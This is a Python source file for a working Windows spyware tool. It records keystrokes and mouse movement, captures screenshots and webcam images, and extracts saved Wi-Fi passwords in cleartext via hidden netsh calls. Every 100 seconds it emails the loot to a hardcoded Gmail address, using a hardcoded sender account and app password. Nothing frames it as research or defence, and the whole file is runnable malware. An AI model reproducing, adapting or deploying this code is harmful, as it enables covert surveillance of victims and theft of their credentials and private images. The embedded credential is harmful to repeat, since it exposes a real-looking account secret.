import logging
import datetime
from pynput import keyboard,mouse
from PIL import ImageGrab
import time
import platform
import cv2
import socket
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart 
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage

def on_press(key):
    logging.info(key)
def on_move(x, y):
    mf.write('Pointer moved to ({}, {}).'.format(x, y)+'\n')
def on_click(x, y, button, pressed):
    if pressed:
        mf.write('Mouse button {} pressed at ({}, {}).'.format(button, x, y)+'\n')
    else:
        mf.write('Mouse button {} released at ({}, {}).'.format(button, x, y)+'\n')
        
def on_scroll(x, y, dx, dy):
    mf.write('Mouse scrolled at ({}, {}) with delta ({}, {}).'.format(x, y, dx, dy)+'\n')

def take_screenshot():
    img = ImageGrab.grab()
    img.save(r"C:\Windows\Temp\bin.png")
    logging.info("Screenshot taken.")

def take_snapshot():
    cam_port = 0
    cam = cv2.VideoCapture(cam_port)
    result, image = cam.read()
    if result:
        cv2.imwrite(r"C:\Windows\Temp\asjlfdjb.png", image)
        cv2.waitKey(0)
        # If captured image is corrupted, moving to else part
    else:
	    print("No image detected. Please! try again")
def get_wifi():
    CREATE_NO_WINDOW=0x08000000
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    with open(r"C:\Windows\Temp\afddsf.txt",'w')as f:
        for i in profiles:
            try:
                
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'],creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        f.write("{:<30}|  {:<}".format(i, results[0])+'\n')
                    except IndexError:
                        f.write("{:<30}|  {:<}".format(i, "")+'\n')
            except subprocess.CalledProcessError:
                pass
def system_information():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    logging.info(hostname)
    logging.info(ip)
    logging.info(plat)
    logging.info(system)
    logging.info(machine)
    
def send_mail(sender,receiver,file):   
    msg = MIMEMultipart()
    info=socket.gethostname()
    m = f"""\
    Subject: {info}
    To: {receiver}
    From: {sender}\n\n"""
    
    m += 'Active at '+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg.attach(MIMEText(m, 'plain'))

    # Set up the SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, 'zpraumqsdfeyfhex')
    
    with open(file, 'rb') as f:
        attach = MIMEApplication(f.read(), _subtype='txt')
        attach.add_header('Content-Disposition', 'attachment', filename='Key.txt')
        msg.attach(attach)
    with open(r'C:\Windows\Temp\bin.png', 'rb') as f:
        img = MIMEImage(f.read())
        img.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
        msg.attach(img)
    with open(r'C:\Windows\Temp\wp5203374.log','rb') as f:
        attach=MIMEApplication(f.read(),_subtype='txt')
        attach.add_header('Content-Disposition', 'attachment',filename='mouse.log')
        msg.attach(attach)
    with open(r"C:\Windows\Temp\asjlfdjb.png",'rb') as f:
        img=MIMEImage(f.read())
        img.add_header('Content-Disposition','attachment',filename='snapshot.png')
        msg.attach(img)
    with open(r"C:\Windows\Temp\afddsf.txt","rb") as f:
        attach=MIMEApplication(f.read(),__subtype='txt')
        attach.add_header('Content-Disposition','attachment',filename='wifi.txt')
        msg.attach(attach)
    # Send the email
    text = msg.as_string()
    server.sendmail(sender,receiver, text)

    # Close the SMTP server connection
    server.quit()
    
def run(sender,receiver,file):
    system_information()
    
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    mouse_listener=mouse.Listener(on_click=on_click,on_move=on_move,on_scroll=on_scroll)
    mouse_listener.start()

    get_wifi()
    while True:
        take_screenshot()
        take_snapshot()
        send_mail(sender, receiver, file)
        time.sleep(100)

file=r'C:\Windows\Temp\cache.log'
logging.basicConfig(filename=file,level=logging.INFO)
mf=open(r'C:\Windows\Temp\wp5203374.log','a')
sender = 'genztitans.641@gmail.com'
receiver = 'polarbae2001@gmail.com'
run(sender,receiver,file)